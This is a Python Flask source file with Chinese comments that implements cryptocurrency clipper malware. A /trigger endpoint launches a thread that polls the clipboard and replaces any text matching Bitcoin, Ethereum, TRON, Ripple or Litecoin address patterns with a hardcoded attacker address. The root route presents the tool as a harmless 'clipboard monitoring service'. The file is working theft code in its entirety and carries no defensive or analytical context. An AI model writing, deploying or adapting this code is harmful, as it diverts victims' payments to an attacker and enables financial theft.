from flask import Flask
import re
import threading
import pyperclip
import time

# 替换的目标地址
ATTACKER_ADDRESS = "panteklu"


def is_crypto_address(address):
    """
    判断给定地址是否为加密货币地址。
    """
    patterns = {
        "Bitcoin (Legacy)": r"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "Bitcoin (SegWit)": r"^bc1[a-zA-HJ-NP-Z0-9]{6,87}$",
        "Ethereum": r"^0x[a-fA-F0-9]{40}$",
        "TRON": r"^T[a-zA-Z0-9]{33}$",
        "Ripple": r"^r[a-zA-Z0-9]{23,43}$",
        "Litecoin": r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,35}$",
    }
    for regex in patterns.values():
        if re.match(regex, address):
            return True
    return False


def monitor_clipboard():
    """
    实时监控剪贴板内容，替换符合规则的加密货币地址。
    """
    previous_content = ""
    while True:
        try:
            clipboard_content = pyperclip.paste()  # 获取当前剪贴板内容
            if clipboard_content != previous_content and is_crypto_address(clipboard_content):
                pyperclip.copy(ATTACKER_ADDRESS)  # 替换剪贴板内容
                print(f"替换结果: {clipboard_content} -> {ATTACKER_ADDRESS}")
                previous_content = ATTACKER_ADDRESS
            else:
                previous_content = clipboard_content  # 保存当前内容，避免重复处理
            time.sleep(0.5)  # 减少 CPU 使用
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
            time.sleep(1)  # 如果出错，稍等后继续尝试


# Flask 应用逻辑
app = Flask(__name__)

@app.route("/", methods=["GET"])
def home():
    """
    根路径响应，通知服务运行正常。
    """
    return "Welcome to the clipboard monitoring service!", 200


@app.route("/trigger", methods=["GET"])
def trigger():
    """
    触发剪贴板监控逻辑。
    """
    threading.Thread(target=monitor_clipboard).start()
    print("Trigger triggered! 剪贴板监控已经启动。")
    return "", 204  # 返回 204 No Content，无页面显示


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
